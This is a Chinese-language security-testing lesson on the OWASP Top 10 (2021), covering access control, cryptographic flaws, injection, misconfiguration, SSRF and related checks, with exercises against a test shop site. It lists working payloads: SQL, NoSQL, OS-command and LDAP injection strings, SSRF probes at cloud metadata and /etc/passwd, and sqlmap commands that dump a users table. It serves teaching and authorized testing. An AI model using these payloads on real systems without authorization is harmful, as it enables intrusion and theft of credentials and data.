# 41-OWASP Top 10 安全测试
> 课时：90 min | 难度：★★★★

## 学习目标
- 掌握 OWASP Top 10 (2021) 全部十个风险类别的定义与攻击原理
- 针对每类风险能独立设计测试用例并执行验证
- 熟练使用注入测试、权限绕过检测、加密缺陷识别等核心测试方法
- 输出符合行业标准的安全测试记录

## 核心概念

### OWASP Top 10 (2021) 概览

| 编号 | 风险类别 | 核心问题 |
|------|----------|----------|
| A01 | 失效的访问控制 | 越权操作、权限校验缺失 |
| A02 | 加密机制失效 | 敏感数据明文传输或存储、弱算法 |
| A03 | 注入 | SQL/NoSQL/OS/LDAP 注入 |
| A04 | 不安全设计 | 架构层面缺乏安全控制 |
| A05 | 安全配置错误 | 默认配置、暴露错误信息、不必要功能 |
| A06 | 自带缺陷和过时的组件 | 已知漏洞的第三方依赖 |
| A07 | 身份认证失败 | 弱口令、会话固定、凭证暴力破解 |
| A08 | 软件和数据完整性故障 | 不安全的 CI/CD、反序列化漏洞 |
| A09 | 安全日志和监控失效 | 日志缺失、告警不足、事件响应迟缓 |
| A10 | 服务端请求伪造 (SSRF) | 服务端发起非预期请求 |

### A01 失效的访问控制 (Broken Access Control)

**攻击类型：**
- **垂直越权**：低权限用户访问高权限功能（普通用户调用管理员 API）
- **水平越权**：同等级用户访问他人数据（修改 URL 参数 `user_id=123` → `user_id=124`）
- **目录遍历**：通过 `../` 跳转读取系统文件
- **CORS 配置错误**：跨域请求未校验 Origin

**测试方法：**
```
1. 识别系统中的权限角色与对应功能
2. 枚举所有需要鉴权的接口（需要登录、需要管理员、需要所有者身份）
3. 低权限会话访问高权限接口 → 预期返回 403
4. 修改资源 ID 参数（IDOR 测试）→ 预期返回 403 或 404
5. 直接访问内部管理路径 /admin/config → 预期重定向到登录或返回 403
6. 检查 HTTP 方法覆盖：GET /api/user/1 DELETE 是否被允许
```

### A02 加密机制失效 (Cryptographic Failures)

**常见缺陷：**
- 敏感数据明文传输（HTTP、明文协议）
- 使用弱哈希算法（MD5、SHA1）存储密码
- 硬编码密钥或密钥管理不当
- 证书校验缺失（接受自签名证书、忽略过期）
- 密码学随机数使用不当（`Math.random()` 生成 Token）

**测试方法：**
```
1. 抓包分析所有敏感数据（密码、Token、身份证号、银行卡号）传输是否加密
2. 检查密码存储算法（bcrypt/scrypt/Argon2 为合规，MD5/SHA1 为不合规）
3. 搜索代码中硬编码的密钥：grep -r "secret\|password\|api_key" --include="*.py"
4. 验证 HTTPS 配置：SSL Labs (ssllabs.com/ssltest) 评级 A 以上为合规
5. 检查 Cookie 是否携带 Secure、HttpOnly、SameSite 属性
```

### A03 注入 (Injection)

**SQL 注入测试：**
```sql
-- 基础测试：单引号
' OR '1'='1
' AND 1=1--
' UNION SELECT null, username, password FROM users--

-- 时间盲注
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- 报错注入
' AND extractvalue(1, concat(0x7e, version()))--
```

**NoSQL 注入测试：**
```json
// MongoDB 操作符注入
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$where": "this.password == 'admin'"}

// 请求体：Content-Type: application/json
{"email": "admin@test.com", "password": {"$regex": "^a"}}
```

**OS 命令注入测试：**
```
; ls
| cat /etc/passwd
`whoami`
$(id)
%0a ls -la
%0d%0a uname -a
```

**LDAP 注入测试：`
```
*)(&
*)(|(&
admin*
*))%00
```

**通用注入测试步骤：**
```
1. 识别所有用户可控输入点（URL 参数、表单字段、HTTP Header、Cookie、文件上传名）
2. 在输入中插入特殊字符（' " ; | & $ ` \）观察响应差异
3. 使用布尔逻辑测试（OR 1=1 / OR 1=2）对比页面变化
4. 时间延迟检测：注入 SLEEP/BENCHMARK 函数观察响应时间
5. 自动化工具验证：sqlmap -u "http://target/page?id=1" --dbs
```

### A04 不安全设计 (Insecure Design)

**测试关注点：**
- 业务流程绕过（跳过支付步骤直接生成订单）
- 频率限制缺失（无验证码的暴力注册/登录）
- 竞争条件（并发请求重复领取优惠券）
- 业务逻辑缺陷（修改金额为负数获得余额增加）

### A05 安全配置错误 (Security Misconfiguration)

**测试清单：**
```
□ 默认凭证测试：admin/admin、admin/password、root/root
□ 默认路径扫描：/admin、/manager、/console、/actuator
□ 目录列表是否开启：访问 /static/ 是否显示文件列表
□ HTTP 方法测试：OPTIONS 是否暴露 PUT/DELETE
□ 错误信息泄露：输入异常参数是否返回堆栈跟踪
□ 安全响应头检查：
  - X-Content-Type-Options: nosniff
  - X-Frame-Options: DENY
  - Content-Security-Policy 是否存在
  - Strict-Transport-Security 是否存在
□ 多余端口/服务暴露检查
□ 生产环境是否关闭 DEBUG 模式
```

### A06 自带缺陷和过时的组件

```bash
# 依赖漏洞扫描
npm audit                      # Node.js 项目
pip-audit                      # Python 项目
mvn org.owasp:dependency-check-maven:check   # Java Maven
bundler-audit check           # Ruby

# 关键信息：关注 CVSS ≥ 7.0 的漏洞，检查是否有可用修复版本
```

### A07 身份认证失败

**测试方法：**
```
1. 弱口令检测：使用 Top 100 密码字典尝试登录
2. 账户锁定：连续输错密码 5 次是否触发锁定
3. 会话固定：登录前后 Session ID 是否变化
4. 会话超时：Token 过期后是否自动失效
5. 记住我功能：Token 是否可预测或长期有效
6. 密码重置：重置 Token 是否单次有效、是否有时效
7. 多因素认证：MFA 是否可被绕过（修改响应包跳过验证步骤）
```

### A08 软件和数据完整性故障

```
- 检查 CI/CD 流水线是否有代码签名验证
- 反序列化测试：修改序列化数据中的类型标识符
- 自动更新包是否校验签名/哈希
- 依赖包锁定文件（package-lock.json、Pipfile.lock）是否存在
```

### A09 安全日志和监控失效

```
- 验证关键操作（登录、密码修改、权限变更、支付）是否记录日志
- 日志是否包含足够信息（时间、用户 IP、操作类型、结果）
- 测试暴力破解是否触发告警
- 检查日志是否可被非授权访问
- 确认日志保留周期满足合规要求（≥ 6 个月）
```

### A10 服务端请求伪造 (SSRF)

```
测试 Payload：
- http://127.0.0.1:8080/admin
- http://169.254.169.254/latest/meta-data/（云环境元数据）
- file:///etc/passwd
- http://internal-service.local/
- 短链绕过：生成指向内网地址的短链接后提交
```

## 动手实操

### 实操 1：SQL 注入检测流程

```bash
# 步骤 1：确认注入点
curl "http://shop.test/api/products?id=1' AND '1'='1"
curl "http://shop.test/api/products?id=1' AND '1'='2"
# 对比两次响应差异

# 步骤 2：使用 sqlmap 自动化检测
sqlmap -u "http://shop.test/api/products?id=1" \
  --batch --level=3 --risk=2 \
  --dbs --threads=5

# 步骤 3：获取数据表
sqlmap -u "http://shop.test/api/products?id=1" \
  -D shop_db --tables

# 步骤 4：导出数据
sqlmap -u "http://shop.test/api/products?id=1" \
  -D shop_db -T users --dump
```

### 实操 2：访问控制测试

```python
import requests

# 水平越权测试
session_user_a = login("user_a", "pass_a")
session_user_b = login("user_b", "pass_b")

# User A 的订单 ID
order_id = "ORD-2024-001"

# 使用 User B 的 session 访问 User A 的订单
resp = session_user_b.get(f"http://shop.test/api/orders/{order_id}")
assert resp.status_code == 403, f"水平越权漏洞存在: {resp.status_code}"

# 垂直越权测试
session_normal = login("normal_user", "pass")
resp_admin = session_normal.get("http://shop.test/api/admin/users")
assert resp_admin.status_code == 403, f"垂直越权漏洞存在: {resp_admin.status_code}"
```

### 实操 3：加密缺陷检测

```python
# 检查响应头安全配置
import requests

def check_security_headers(url):
    resp = requests.get(url, verify=False)
    required_headers = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "Strict-Transport-Security": None,  # 只需存在
        "Content-Security-Policy": None,
    }
    
    missing = []
    for header, expected_value in required_headers.items():
        actual = resp.headers.get(header)
        if actual is None:
            missing.append(f"缺少响应头: {header}")
        elif expected_value and actual != expected_value:
            missing.append(f"{header} 值不正确: 期望 {expected_value}, 实际 {actual}")
    
    return missing

issues = check_security_headers("https://shop.test")
for issue in issues:
    print(issue)
```

## 常见坑

- sqlmap 的 `--level` 和 `--risk` 参数过低会导致漏测；Level 3+ Risk 2+ 覆盖更全
- 访问控制测试需覆盖所有 HTTP 方法（GET/POST/PUT/DELETE），仅测 GET 会遗漏
- 加密缺陷不能仅看"是否 HTTPS"，需检查 TLS 版本（TLS 1.0/1.1 已废弃）、证书链完整性
- OWASP 类别之间存在交叉（如注入本质也是访问控制问题），测试时避免按类别机械切割
- 自动化工具存在误报，所有阳性结果需人工复测确认
- 测试前必须获取书面授权，未授权测试属于违法行为

## 自测清单

- [ ] 能列举 OWASP Top 10 (2021) 全部类别并描述其攻击原理
- [ ] 能独立编写 SQL/NoSQL/OS/LDAP 注入测试 Payload
- [ ] 能区分水平越权与垂直越权并设计对应测试用例
- [ ] 能使用至少一种自动化工具执行安全扫描
- [ ] 能识别常见安全配置缺陷（默认凭证、目录列表、响应头缺失）
- [ ] 能解释 CVSS 评分中 Attack Vector 与 Attack Complexity 的含义
- [ ] 理解 SSRF 与 CSRF 的区别及各自的测试方法

## 延伸阅读

- OWASP Top 10 官方文档：https://owasp.org/Top10/
- OWASP Testing Guide：https://owasp.org/www-project-web-security-testing-guide/
- sqlmap 官方文档：https://sqlmap.org/
- PortSwigger Web Security Academy（免费实验）：https://portswigger.net/web-security
- CVSS v3.1 计算公式：https://www.first.org/cvss/calculator/3.1
